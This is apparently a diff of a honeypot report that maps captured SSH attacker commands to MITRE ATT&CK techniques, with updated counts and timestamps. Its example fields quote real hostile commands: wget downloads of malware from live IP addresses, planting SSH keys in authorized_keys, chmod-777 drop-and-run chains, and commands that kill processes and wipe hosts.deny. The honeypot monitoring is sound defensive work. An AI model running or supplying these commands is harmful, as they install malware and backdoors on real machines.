@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-28 19:01:47",
+  "generated": "2026-09-28 20:04:48",
   "totals": {
-    "commands": 4848,
-    "login_failed": 4945,
-    "login_success": 1069,
-    "sessions": 5542
+    "commands": 4933,
+    "login_failed": 5046,
+    "login_success": 1073,
+    "sessions": 5671
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4945,
+      "count": 5046,
       "examples": [
         "admin / admin",
         "admin / admins",
@@ -21,14 +21,14 @@
         "casie / casie123"
       ],
       "first": "2026-09-28T00:01:12.771895Z",
-      "last": "2026-09-28T19:00:17.878439Z",
-      "unique_ips": 129
+      "last": "2026-09-28T20:04:24.972623Z",
+      "unique_ips": 135
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1069,
+      "count": 1073,
       "examples": [
         "root / root",
         "root / password",
@@ -37,14 +37,14 @@
         "developer / root"
       ],
       "first": "2026-09-28T00:01:14.476654Z",
-      "last": "2026-09-28T18:49:57.070972Z",
-      "unique_ips": 105
+      "last": "2026-09-28T19:38:14.546387Z",
+      "unique_ips": 109
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 893,
+      "count": 896,
       "examples": [
         "ls -lh $(which ls)",
         "ls -l /tmp/.testfile 2>&1",
@@ -52,14 +52,14 @@
         "ls /home; /bin/busybox BOTNET"
       ],
       "first": "2026-09-28T03:58:10.356245Z",
-      "last": "2026-09-28T18:50:12.670751Z",
-      "unique_ips": 34
+      "last": "2026-09-28T19:38:31.277354Z",
+      "unique_ips": 37
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 778,
+      "count": 799,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -68,14 +68,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-28T00:01:18.281427Z",
-      "last": "2026-09-28T18:49:59.496573Z",
-      "unique_ips": 72
+      "last": "2026-09-28T19:38:16.996040Z",
+      "unique_ips": 76
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 300,
+      "count": 327,
       "examples": [
         "uname -m 2>/dev/null; cat /proc/cpuinfo 2>/dev/null | head -c 512",
         "uname -a",
@@ -84,14 +84,14 @@
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
       ],
       "first": "2026-09-28T00:25:11.477965Z",
-      "last": "2026-09-28T18:50:25.396169Z",
-      "unique_ips": 46
+      "last": "2026-09-28T19:38:44.989341Z",
+      "unique_ips": 49
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 87,
+      "count": 94,
       "examples": [
         "f=.main_x86_64; (wget -qO $f http://77.90.185.107/main_x86_64 2>/dev/null || busybox wget -qO $f http://77.90.185.107/ma",
         "http://77.90.185.107/main_x86_64",
@@ -100,14 +100,14 @@
         "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a"
       ],
       "first": "2026-09-28T00:25:14.285887Z",
-      "last": "2026-09-28T18:49:59.818851Z",
-      "unique_ips": 43
+      "last": "2026-09-28T19:38:17.409379Z",
+      "unique_ips": 47
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 70,
+      "count": 77,
       "examples": [
         "w",
         "whoami",
@@ -116,41 +116,41 @@
         "id"
       ],
       "first": "2026-09-28T03:58:11.852861Z",
-      "last": "2026-09-28T18:50:22.875825Z",
-      "unique_ips": 39
+      "last": "2026-09-28T19:38:42.303911Z",
+      "unique_ips": 43
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 64,
+      "count": 70,
       "examples": [
         "ps 2>/dev/null | grep -v grep | grep -c 'main_x86_64'; echo V_END",
         "crontab -l",
         "top"
       ],
       "first": "2026-09-28T00:25:20.278527Z",
-      "last": "2026-09-28T18:50:19.089140Z",
-      "unique_ips": 32
+      "last": "2026-09-28T19:38:38.185748Z",
+      "unique_ips": 35
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 34,
+      "count": 37,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-09-28T03:58:02.784217Z",
-      "last": "2026-09-28T18:49:59.496573Z",
-      "unique_ips": 34
+      "last": "2026-09-28T19:38:16.996040Z",
+      "unique_ips": 37
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 24,
+      "count": 25,
       "examples": [
         "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
@@ -159,22 +159,22 @@
         "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
       ],
       "first": "2026-09-28T01:10:39.190816Z",
-      "last": "2026-09-28T18:17:47.757113Z",
-      "unique_ips": 17
+      "last": "2026-09-28T19:33:06.040555Z",
+      "unique_ips": 18
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 20,
+      "count": 21,
       "examples": [
         "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep"
       ],
       "first": "2026-09-28T01:10:39.190816Z",
-      "last": "2026-09-28T17:15:06.888749Z",
-      "unique_ips": 13
+      "last": "2026-09-28T19:33:06.040555Z",
+      "unique_ips": 14
     },
     {
       "id": "T1059.004",
@@ -204,11 +204,11 @@
   "unmapped": [
     [
       "sh",
-      970
+      971
     ],
     [
       "system",
-      970
+      971
     ],
     [
       "/bin/busybox HISILICON",
@@ -216,11 +216,11 @@
     ],
     [
       "shell",
-      117
+      118
     ],
     [
       "enable",
-      117
+      118
     ],
     [
       "ping; sh",
@@ -247,6 +247,10 @@
       19
     ],
     [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
+    ],
+    [
       "cd /tmp",
       10
     ],
@@ -263,24 +267,20 @@
       8
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
-    ],
-    [
       "/bin/busybox",
       8
     ],
     [
-      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
-      3
-    ],
-    [
       "linuxshell",
-      3
+      4
     ],
     [
       "ping ;sh",
-      3
+      4
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      4
     ]
   ]
 }
